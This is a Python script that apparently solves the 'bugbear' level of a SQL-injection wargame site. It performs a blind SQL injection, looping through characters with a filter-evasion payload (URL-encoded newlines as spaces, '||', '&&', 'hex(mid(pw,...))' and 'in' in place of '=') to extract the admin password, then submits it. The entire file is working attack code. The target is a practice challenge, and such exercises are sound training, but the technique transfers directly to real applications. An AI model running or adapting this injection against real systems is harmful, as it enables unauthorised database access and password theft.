import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookies = {'PHPSESSID': session_id}


def get_pw():
    length = 8
    pw = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            payload = f'?no=0%0a||%0ahex(mid(pw,{i},1))%0ain%0a(hex({j}))%0a%26%26%0aid%0ain%0a("admin")'
            res = requests.get(url + payload, cookies=cookies)

            if "Hello admin" in res.text:
                pw += chr(j)
                print(chr(j), end=" ")
                break
    return pw


pw = get_pw()
print()
print("pw :", pw)
params = {
    'pw': pw
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
